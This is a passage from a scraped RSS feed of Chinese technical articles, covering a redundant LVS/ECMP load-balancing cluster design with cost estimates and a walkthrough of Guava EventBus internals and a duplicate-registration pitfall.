拆分，每个路由拥有一个公网 ip，承载 100G 带宽，注意，此处的路由真的是路由，并不是网关，它只需要告诉每一个数据包该到哪儿去即可。这个架构中的网关其实是后面的 LVS 充当的。而硬件路由设备承受住 200G 带宽甚至都不需要上高端的数据中心核心设备。&lt;/p&gt;&lt;h4&gt;2. 拆除交换机单点：OSPF/ECMP 路由技术&lt;/h4&gt;&lt;p&gt;上图中的&lt;code&gt;路由_1&lt;/code&gt;和&lt;code&gt;路由_2&lt;/code&gt;采用支持 ECMP 的硬件设备或者软件路由来充当，他们会把流量平均分给两个交换机。每台交换机承载 100G 带宽，对交换机来说简直就是洒洒水，2 万块人民币的硬件交换机就能接近 24 x 100G 全线速交换（二手的甚至只要六千块）。&lt;/p&gt;&lt;h4&gt;3. 拆除服务器单点：LVS 单机双网卡四网口&lt;/h4&gt;&lt;p&gt;每台 LVS 服务器都安装双口 100G 网卡 2 张，共有四个网口，这样单机可以实现 50G x 2 的极限性能。每个网卡上面的两个网口，分别连接两台交换机，可以在实现了高可用的同时保证协议速度(线速)不会成为瓶颈。&lt;/p&gt;&lt;h4&gt;4. 天下无单点：全冗余架构&lt;/h4&gt;&lt;p&gt;大家可以看到，从左至右，整个架构的每一层的每一个节点，都和左边一层的所有节点进行连接，这种全冗余架构可以满足在任意一台设备宕机的情况下，整个系统依然可用，甚至系统容量都能维持不变。&lt;/p&gt;&lt;p&gt;如果某台路由宕机，则另一台路由会将它的公网 ip 接过来，可以实现分钟级故障恢复（主要是公网路由表可能更新缓慢）。&lt;/p&gt;&lt;p&gt;如果某台交换机宕机，则左侧的路由通过 ECMP 及时调整路由配置，可以实现秒级切换。&lt;/p&gt;&lt;p&gt;如果某台 LVS 服务器宕机：Keepalived 机制会让 Standby 设备在 1 秒之内顶上。&lt;/p&gt;&lt;h4&gt;系统容量计算&lt;/h4&gt;&lt;p&gt;对于整个系统来说，四台安装了双网卡的 LVS 服务器，2 主 2 备，在两个公网 ip 入口的情况下，可以实现 50G x 2 x 2 = 200G 的总带宽，并且任意一台设备宕机不影响系统总容量。&lt;/p&gt;&lt;p&gt;200G 并不是这个系统的极限，如果我们让一组的两台 LVS 服务器使用两个 VIP 做互为主备的双活的话，可以把整个系统的容量提升到理论极限 400G。下面我们分析一下各种单项资源的性能极限：&lt;/p&gt;&lt;ol class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;p&gt;单个公网 ip：最大带宽为系统最大容量 200G&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;单个 VIP：最大带宽为 100G&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;单个数据流：最大带宽为单网卡性能极限 50G&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;还记得上面那台 100 万的硬件负载均衡器吗，他的最大 L4 带宽只有 40G，而我们这一套 200/400G 的设备要多少钱呢？&lt;/p&gt;&lt;p&gt;1x2 + 2x2 + 3x4 = 18万&lt;/p&gt;&lt;h4&gt;额外的优势&lt;/h4&gt;&lt;p&gt;花 18 万搭建一套图中的设备，不仅可以搞出一套 200G 的集群，而且图中的路由和交换机还有大量的容量可以用于其他业务。&lt;/p&gt;&lt;p&gt;更重要的是：LVS 集群相比于硬件负载均衡设备是可以轻松控制的，是可编程的，这对于右侧上游服务器的网络架构规划十分有利。对于云计算厂商来说，可以开发更丰富的功能来提供更复杂的服务（例如计算和存储分离的数据库），提升硬件资源的利用率，同时可以提供更复杂的功能给云平台用户使用：&lt;/p&gt;&lt;p&gt;软件带来的无限可能才是这套配置最核心的价值！&lt;/p&gt;&lt;h2&gt;彩蛋&lt;/h2&gt;&lt;h3&gt;殊途共归：硬件厂商的软件设计&lt;/h3&gt;&lt;p&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.5247863247863248&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_jpg/qehPQXlzsA2dFWZAhfzT9Hvdg53dx3CNxfRde5X7b05M6tI8tDxcGa8Gs90CiaCDfkv0pHrYXCGJDkQ8qftwib3A/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;2340&quot;/&gt;&lt;/p&gt;&lt;p&gt;这是 H3C 集团 ComwareV7 通用操作系统的架构图，当下 H3C 正在销售的产品中，除了网络边界设备（如防火墙）外，其余几乎所有的交换机、AC、AP 等以局域网为主战场的设备已经全面采用了该系统。和上一代 V5 相比，最大的变化就是把系统内核切换到了 Linux kernel。&lt;/p&gt;&lt;p&gt;这张图中最重要的就是那根“细细的红线”：网络管理进程完全位于用户态。这其实就是 DPDK 思想：传统的 UNIX 网络模型已经无法应付单机 10G 的速度了，需要读写内存的进程切换太慢了，必须要从底层网络数据处理流程上革命：抛弃操作系统提供的网络栈，直接在用户态接管所有网络流量，实现更高性能。&lt;/p&gt;&lt;p&gt;为了提高软件稳定性，H3C 也在系统内开发了一些高可用技术，和我们负载均衡集群高可用的设计思想不谋而合，异曲同工：&lt;/p&gt;&lt;ol class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;p&gt;支持单播、组播和热迁移的高可靠 IPC(进程间通信)技术：对应的是双机热备以及 OSPF/ECMP、VRRP 协议等&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;多进程主备选举：对应的是 Keepalived 集群选举&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;进程级内存备份(实时热备进程的内存，用于快速故障恢复和主从切换)：对应的是 OSPF/ECMP 不丢包多活技术、服务器的内存镜像技术&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;h3&gt;我对于设备故障的经验&lt;/h3&gt;&lt;p&gt;在机房硬件设备中，最容易损坏的肯定是磁盘（硬盘），因为它是在不断磨损的，即便是 SSD 也会随着时间的流逝寿命逐渐丢失，哪怕装在盒子里不通电也一样。但是硬盘之后，容易宕机或者损坏的是什么大家应该就猜不到了。&lt;/p&gt;&lt;p&gt;首先是断电：数据中心因为各种问题断电是最常见的故障，这个故障的概率甚至要高于软件引发的故障和电源适配器的故障。&lt;/p&gt;&lt;p&gt;其次是内存失效：内存以及内存插槽，内存电路，似乎是今天服务器硬件之中除了磁盘之外最容易坏的东西，马上就要进入 DDR5 时代，内存功耗又上了一个台阶，恐怕故障率会进一步上升。&lt;/p&gt;&lt;p&gt;然后是网络线材和供电线材接口的问题，时间长了松了或者进灰了，就会丢包或者重启。2011 年震惊世界的中微子超光速事件，就是插头松了导致的。&lt;/p&gt;&lt;p&gt;最后是高温引发的宕机：特别是 GPU 服务器，一旦服务器或者机房的散热系统出现问题，服务器很容易就主动限制性能甚至关机。&lt;/p&gt;&lt;p&gt;其它的，硬件网络设备（路由器交换机）故障、彻底挖断光纤、CPU 损坏、电源转换器寿命耗尽、主板电池故障、地震火灾洪水等，可能在一台服务器的上架寿命之中都完全无法遇到。&lt;/p&gt;&lt;h3&gt;还记得我们的目标吗？一百万 QPS&lt;/h3&gt;&lt;p&gt;通过本文构建的这个 200/400G 负载均衡集群，配合多个应用网关，以及后面海量的物理服务器，我们终于成功实现了一百万 QPS 的目标。但是，这就是一百万 QPS 的全部了吗？当然不是，这只是 web 服务层面的百万 QPS，在真实世界中，数据库才是那个最难解决的单点。&lt;/p&gt;&lt;h3&gt;接下来&lt;/h3&gt;&lt;p&gt;下一篇文章，我们将直面最难以解决的单点：数据库以及它背后的存储，探寻&lt;code&gt;IOE&lt;/code&gt;中最难去掉的那个&lt;code&gt;E&lt;/code&gt;。&lt;/p&gt;&lt;h3&gt;参考资料&lt;/h3&gt;&lt;ol class=&quot;list-paddingleft-1&quot;&gt;&lt;li&gt;&lt;p&gt;Envoy 作者 Matt Klein 2017 年的一篇英文博客 Introduction to modern network load balancing and proxying https://blog.envoyproxy.io/introduction-to-modern-network-load-balancing-and-proxying-a57f6ff80236&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;用dperf测试LVS的性能数据 &lt;a href=&quot;https://mp.weixin.qq.com/s?__biz=Mzg5MjcyNzY4Mg==&amp;amp;mid=2247483684&amp;amp;idx=1&amp;amp;sn=9a065f97f1a239efbb371fedde3b8d3e&amp;amp;scene=21#wechat_redirect&quot; target=&quot;_blank&quot; data-linktype=&quot;2&quot;&gt;https://mp.weixin.qq.com/s?__biz=Mzg5MjcyNzY4Mg==&amp;amp;mid=2247483684&amp;amp;idx=1&amp;amp;sn=9a065f97f1a239efbb371fedde3b8d3e&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;高性能负载均衡设计与实现 https://zhuanlan.zhihu.com/p/29949340&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;本系列文章已经汇总成开源技术书《PPHC》发布在 Github：https://github.com/johnlui/PPHC&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;mp-style-type data-value=&quot;3&quot;/&gt;&lt;/p&gt;&lt;/div&gt;

          
        &lt;/div&gt;&lt;/div&gt;</content:encoded>
</item>
<item>
<guid>102dade5263cb75c6e930abe43ce013d</guid>
<title>一文读懂 Guava EventBus（订阅\发布事件）</title>
<link>https://toutiao.io/k/pgpwokb</link>
<content:encoded>&lt;div&gt;&lt;div&gt;&lt;div class=&quot;preview&quot;&gt;&lt;h4&gt;作者：京东科技 刘子洋&lt;/h4&gt;

&lt;h1&gt;背景&lt;/h1&gt;

&lt;p&gt;最近项目出现同一消息发送多次的现象，对下游业务方造成困扰，经过排查发现使用EventBus方式不正确。也借此机会学习了下EventBus并进行分享。以下为分享内容，本文主要分为五个部分，篇幅较长，望大家耐心阅读。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;1、简述：简单介绍EventBus及其组成部分。&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;2、原理解析：主要对listener注册流程及Event发布流程进行解析。&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;3、使用指导：EventBus简单的使用指导。&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;4、注意事项：在使用EventBus中需要注意的一些隐藏逻辑。&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;5、分享时提问的问题&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;6、项目中遇到的问题：上述问题进行详细描述并复现场景。&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h1&gt;1、简述&lt;/h1&gt;

&lt;h2&gt;1.1、概念&lt;/h2&gt;

&lt;p&gt;下文摘自EventBus源码注释，从注释中可以直观了解到他的&lt;strong&gt;功能、特性、注意事项&lt;/strong&gt;。&lt;/p&gt;

&lt;p&gt;【源码注释】&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Dispatches events to listeners, and provides ways for listeners to register themselves.&lt;/p&gt;

&lt;p&gt;The EventBus allows publish-subscribe-style communication between components without requiring the components to explicitly register with one another (and thus be aware of each other). It is designed exclusively to replace traditional Java in-process event distribution using explicit registration. It is not a general-purpose publish-subscribe system, nor is it intended for interprocess communication.&lt;/p&gt;

&lt;p&gt;Receiving Events&lt;/p&gt;

&lt;p&gt;To receive events, an object should:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Expose a public method, known as the event subscriber, which accepts a single argument of the type of event desired;&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Mark it with a Subscribe annotation;&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Pass itself to an EventBus instance&#x27;s register(Object) method.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Posting Events&lt;/p&gt;

&lt;p&gt;To post an event, simply provide the event object to the post(Object) method. The EventBus instance will determine the type of event and route it to all registered listeners.&lt;/p&gt;

&lt;p&gt;Events are routed based on their type — an event will be delivered to any subscriber for any type to which the event is assignable. This includes implemented interfaces, all superclasses, and all interfaces implemented by superclasses.&lt;/p&gt;

&lt;p&gt;When post is called, all registered subscribers for an event are run in sequence, so subscribers should be reasonably quick. If an event may trigger an extended process (such as a database load), spawn a thread or queue it for later. (For a convenient way to do this, use an AsyncEventBus.)&lt;/p&gt;

&lt;p&gt;Subscriber Methods&lt;/p&gt;

&lt;p&gt;Event subscriber methods must accept only one argument: the event.&lt;/p&gt;

&lt;p&gt;Subscribers should not, in general, throw. If they do, the EventBus will catch and log the exception. This is rarely the right solution for error handling and should not be relied upon; it is intended solely to help find problems during development.&lt;/p&gt;

&lt;p&gt;The EventBus guarantees that it will not call a subscriber method from multiple threads simultaneously, unless the method explicitly allows it by bearing the AllowConcurrentEvents annotation. If this annotation is not present, subscriber methods need not worry about being reentrant, unless also called from outside the EventBus.&lt;/p&gt;

&lt;p&gt;Dead Events&lt;/p&gt;

&lt;p&gt;If an event is posted, but no registered subscribers can accept it, it is considered &quot;dead.&quot; To give the system a second chance to handle dead events, they are wrapped in an instance of DeadEvent and reposted.&lt;/p&gt;

&lt;p&gt;If a subscriber for a supertype of all events (such as Object) is registered, no event will ever be considered dead, and no DeadEvents will be generated. Accordingly, while DeadEvent extends Object, a subscriber registered to receive any Object will never receive a DeadEvent.&lt;/p&gt;

&lt;p&gt;This class is safe for concurrent use.&lt;/p&gt;

&lt;p&gt;See the Guava User Guide article on EventBus.&lt;br/&gt;
Since:&lt;br/&gt;
10.0&lt;br/&gt;
Author:&lt;br/&gt;
Cliff Biffle&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2&gt;1.2、系统流程&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-34hhFYGHy2tAeI3jh.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;

&lt;h2&gt;1.3、组成部分&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-35CNd87spqws8i8Xi.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;

&lt;h3&gt;1.3.1、调度器&lt;/h3&gt;

&lt;p&gt;EventBus、AsyncEventBus都是一个调度的角色，区别是一个同步一个异步。&lt;/p&gt;



&lt;pre&gt;&lt;code&gt;源码注释：
&amp;gt; Dispatches events to listeners, and provides ways for listeners to register themselves.

意思是说EventBus分发事件（Event）给listeners处理，并且提供listeners注册自己的方法。从这里我们可以看出EventBus主要是一个调度的角色。

**EventBus总结**
- 1.同步执行，事件发送方在发出事件之后，会等待所有的事件消费方执行完毕后，才会回来继续执行自己后面的代码。
- 2.事件发送方和事件消费方会在同一个线程中执行，消费方的执行线程取决于发送方。
- 3.同一个事件的多个订阅者，在接收到事件的顺序上面有不同。谁先注册到EventBus的，谁先执行，如果是在同一个类中的两个订阅者一起被注册到EventBus的情况，收到事件的顺序跟方法名有关。


&lt;/code&gt;&lt;/pre&gt;



&lt;pre&gt;&lt;code&gt;源码注释：
&amp;gt; An {@link EventBus} that takes the Executor of your choice and uses it to dispatch events, allowing dispatch to occur asynchronously.

意思是说AsyncEventBus就是EventBus，只不过AsyncEventBus使用你指定的线程池（不指定使用默认线程池）去分发事件（Event），并且是异步进行的。

**AsyncEventBus总结**
- 1.异步执行，事件发送方异步发出事件，不会等待事件消费方是否收到，直接执行自己后面的代码。
- 2.在定义AsyncEventBus时，构造函数中会传入一个线程池。事件消费方收到异步事件时，消费方会从线程池中获取一个新的线程来执行自己的任务。
- 3.同一个事件的多个订阅者，它们的注册顺序跟接收到事件的顺序上没有任何联系，都会同时收到事件，并且都是在新的线程中，**异步并发**的执行自己的任务。


&lt;/code&gt;&lt;/pre&gt;

&lt;h3&gt;1.3.2、事件承载器&lt;/h3&gt;



&lt;pre&gt;&lt;code&gt;事件主体，用于承载消息。


&lt;/code&gt;&lt;/pre&gt;



&lt;pre&gt;&lt;code&gt; 源码注释：
&amp;gt;Wraps an event that was posted, but which had no subscribers and thus could not be delivered, Registering a DeadEvent subscriber is useful for debugging or logging, as it can detect misconfigurations in a system&#x27;s event distribution.

意思是说DeadEvent就是一个被包装的event，只不过是一个没有订阅者无法被分发的event。我们可以在开发时注册一个DeadEvent，因为它可以检测系统事件分布中的错误配置。


&lt;/code&gt;&lt;/pre&gt;

&lt;h3&gt;1.3.3、事件注册中心&lt;/h3&gt;

&lt;p&gt;SubscriberRegistry&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; 源码注释：
&amp;gt;  Registry of subscribers to a single event bus.
意思是说SubscriberRegistry是单个事件总线（EventBus）的订阅者注册表。


&lt;/code&gt;&lt;/pre&gt;

&lt;h3&gt;1.3.4、事件分发器&lt;/h3&gt;

&lt;p&gt;Dispatcher&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;源码注释：
&amp;gt;Handler for dispatching events to subscribers, providing different event ordering guarantees that make sense for different situations.

&amp;gt;Note: The dispatcher is orthogonal to the subscriber&#x27;s Executor. The dispatcher controls the order in which events are dispatched, while the executor controls how (i.e. on which thread) the subscriber is actually called when an event is dispatched to it.

意思是说Dispatcher主要任务是将事件分发到订阅者，并且可以不同的情况，按不同的顺序分发。


&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Dispatcher有三个子类，用以满足不同的分发情况&lt;/p&gt;

&lt;p&gt;1.PerThreadQueuedDispatcher&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;源码注释：
&amp;gt; Returns a dispatcher that queues events that are posted reentrantly on a thread that is already dispatching an event, guaranteeing that all events posted on a single thread are dispatched to all subscribers in the order they are posted.

&amp;gt; When all subscribers are dispatched to using a direct executor (which dispatches on the same thread that posts the event), this yields a breadth-first dispatch order on each thread. That is, all subscribers to a single event A will be called before any subscribers to any events B and C that are posted to the event bus by the subscribers to A.

意思是说一个线程在处理事件过程中又发布了一个事件，PerThreadQueuedDispatcher会将后面这个事件放到最后，从而保证在单个线程上发布的所有事件都按其发布顺序分发给订阅者。**注意，每个线程都要自己存储事件的队列。**

第二段是说PerThreadQueuedDispatcher按**广度优先**分发事件。并给了一个例子：
代码中发布了事件A，订阅者收到后，在执行过程中又发布了事件B和事件C，PerThreadQueuedDispatcher会确保事件A分发给所有订阅者后，再分发B、C事件。


&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;2.LegacyAsyncDispatcher&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;源码注释：
&amp;gt; Returns a dispatcher that queues events that are posted in a single global queue. This behavior matches the original behavior of AsyncEventBus exactly, but is otherwise not especially useful. For async dispatch, an immediate dispatcher should generally be preferable.

意思是说LegacyAsyncDispatcher有一个全局队列用于存放所有事件，LegacyAsyncDispatcher特性与AsyncEventBus特性完全相符，除此之外没有其他什么特性。如果异步分发的话，最好用immediate dispatcher。


&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;3.ImmediateDispatcher&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;源码注释：
&amp;gt; Returns a dispatcher that dispatches events to subscribers immediately as they&#x27;re posted without using an intermediate queue to change the dispatch order. This is effectively a depth-first dispatch order, vs. breadth-first when using a queue.

意思是说ImmediateDispatcher在发布事件时立即将事件分发给订阅者，而不使用中间队列更改分发顺序。这实际上是**深度优先**的调度顺序，而不是使用队列时的**广度优先**。


&lt;/code&gt;&lt;/pre&gt;

&lt;h3&gt;1.3.4、订阅者&lt;/h3&gt;



&lt;pre&gt;&lt;code&gt;源码注释：
&amp;gt; A subscriber method on a specific object, plus the executor that should be used for dispatching events to it.

Two subscribers are equivalent when they refer to the same method on the same object (not class). This property is used to ensure that no subscriber method is registered more than once.

第一段意思是说，Subscriber是特定对象（Event）的订阅方法，用于执行被分发事件。第二段说当两个订阅者在同一对象 **（不是类）** 上引用相同的方法时，它们是等效的，此属性用于确保不会多次注册任何订阅者方法，主要说明会对订阅者进行判重，如果是同一个对象的同一个方法，则认为是同一个订阅者，不会进行重复注册。


&lt;/code&gt;&lt;/pre&gt;



&lt;pre&gt;&lt;code&gt;源码注释：
&amp;gt; Subscriber that synchronizes invocations of a method to ensure that only one thread may enter the method at a time.

意思是说同步方法调用以确保一次只有一个线程可以执行订阅者方法（线程安全）。


&lt;/code&gt;&lt;/pre&gt;

&lt;h1&gt;2、原理解析&lt;/h1&gt;

&lt;h2&gt;2.1、主体流程&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;listener 通过EventBus进行注册。&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;SubscriberRegister 会根据listener、listener中含有【@Subscribe】注解的方法及各方法参数创建Subscriber 对象，并将其维护在Subscribers（ConcurrentMap类型，key为event类对象，value为subscriber集合）中。&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;publisher发布事件Event。&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;发布Event后，EventBus会从SubscriberRegister中查找出所有订阅此事件的Subscriber，然后让Dispatcher分发Event到每一个Subscriber。&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;流程如下：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-35ZoCIOMPMZ3XFjO35.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;

&lt;h2&gt;2.2、listener注册原理&lt;/h2&gt;

&lt;h3&gt;2.2.1、listener注册流程&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;缓存所有含有@Subscribe注解方法到subscriberMethodsCache（LoadingCache&lt;class&gt;, ImmutableList&amp;gt;， key为listener，value为method集合）。&lt;/class&gt;&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;listener注册。&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-35vFAQZ28dWGeyCzk.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;

&lt;h3&gt;2.2.2、原理分析&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;  获取含有@Subscribe注释的方法进行缓存&lt;br/&gt;
找到所有被【@Subscribe】修饰的方法，并进行缓存&lt;br/&gt;
&lt;strong&gt;注意！！！这两个方法被static修饰，类加载的时候就进行寻找&lt;/strong&gt;&lt;br/&gt;
&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-363632jcSA363HmIqDrO.png&quot; alt=&quot;image.png&quot;/&gt;&lt;br/&gt;
&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-36qD8hcLnttDbTKkH.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;订阅者唯一标识是【方法名+入参】&lt;br/&gt;
&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-36sYr36D8wm728xLok.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;  注册订阅者&lt;br/&gt;
1.注册方法&lt;br/&gt;
&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-37CKeAug118jTsL3HR.png&quot; alt=&quot;image.png&quot;/&gt;&lt;br/&gt;
创建Subscriber时，如果method含有【@AllowConcurrentEvents】注释，则创建SynchronizedSubscriber，否则创建Subscriber&lt;br/&gt;
&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-37FTLB9ojhgA6ajJ37.png&quot; alt=&quot;image.png&quot;/&gt;&lt;br/&gt;
2、获取所有订阅者&lt;br/&gt;
&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-37BNnJadaGDajnlv7.png&quot; alt=&quot;image.png&quot;/&gt;&lt;br/&gt;
3、从缓存中获取所有订阅方法&lt;br/&gt;
&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-37uJjWQomNFoAXoOc.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;2.3、Event发布原理&lt;/h2&gt;

&lt;h3&gt;2.3.1、发布主体流程&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;publisher 发布事件Event。&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;EventBus 根据Event 类对象从SubscriberRegistry中获取所有订阅者。&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;将Event 和 eventSubscribers 交由Dispatcher去分发。&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Dispatcher 将Event 分发给每个Subscribers。&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Subscriber 利用反射执行订阅者方法。&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;图中画出了三个Dispatcher的分发原理。&lt;br/&gt;
&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-38gUVcxWJdDxgOepS.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;

&lt;h3&gt;2.3.2、原理分析&lt;/h3&gt;



&lt;h1&gt;3、使用指导&lt;/h1&gt;

&lt;h2&gt;3.1、主要流程&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-44EIcwn73n2fAw9m3.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;

&lt;h2&gt;3.2、流程详解&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;1、创建EventBus、AsyncEventBus Bean&lt;br/&gt;
在项目中统一配置全局单例Bean（如特殊需求，可配置多例）&lt;br/&gt;
&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-44h0B7YvpUoluhSYt.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;2、定义EventMsg&lt;br/&gt;
设置消息载体。&lt;br/&gt;
&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-45WsFZ0rd456wCYQF8.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;3、注册Listener&lt;br/&gt;
注册Listener，处理事件&lt;br/&gt;
&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-45GWEuo09o7vFxTJ3.png&quot; alt=&quot;image.png&quot;/&gt;&lt;br/&gt;
&lt;strong&gt;注意! 在使用 PostConstruct注释进行注册时，需要注意子类会执行父类含有PostConstruct 注释的方法。&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;3、事件发布&lt;br/&gt;
封装统一发布事件的Bean，然后通过Bean注入到需要发布的Bean里面进行事件发布。&lt;br/&gt;
&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-45jydFrk8sCcCenv3.png&quot; alt=&quot;image.png&quot;/&gt;&lt;br/&gt;
&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-45j3wc7Z3l453cn9ai.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;此处对EventBus进行了统一封装收口操作，主要考虑的是如果做一些操作，直接改这一处就可以。如果不需要封装，可以在使用的地方直接注入EventBus即可。&lt;/strong&gt;&lt;/p&gt;

&lt;h1&gt;4、注意事项&lt;/h1&gt;

&lt;h2&gt;4.1、循环分发事件&lt;/h2&gt;

&lt;p&gt;如果业务流程较长，切记梳理好业务流程，不要让事件循环分发。&lt;br/&gt;
目前EventBus没有对循环事件进行处理。&lt;/p&gt;

&lt;h2&gt;4.2、使用 @PostConstrucrt 注册listener&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;子类在执行实例化时，会执行父类@PostConstrucrt 注释&lt;/strong&gt;。 如果listenerSon继承listenerFather，当两者都使用@PostConstrucrt注册订阅方法时，子类也会调用父类的注册方法进行注册订阅方法。&lt;strong&gt;由于EventBus机制，子类注册订阅方法时，也会注册父类的监听方法&lt;/strong&gt;&lt;br/&gt;
&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-46XM3CmgeO9xjpTfV.png&quot; alt=&quot;image.png&quot;/&gt;&lt;br/&gt;
Subscriber唯一标志是（listener+method），因此在对同一方法注册时，由于不是同一个listener，所以对于EventBus是两个订阅方法。&lt;br/&gt;
&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-46f9JVHDmpmPprhGS.png&quot; alt=&quot;image.png&quot;/&gt;&lt;br/&gt;
&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-46FWvUbRg6r9U469og.png&quot; alt=&quot;image.png&quot;/&gt;&lt;br/&gt;
&lt;img src=&quot;https://s3.cn-north-1.jdcloud-oss.com/shendengbucket1/2023-02-03-15-47KJ2EDHX0zcNMVqW.png&quot; alt=&quot;image.png&quot;/&gt;&lt;/p&gt;

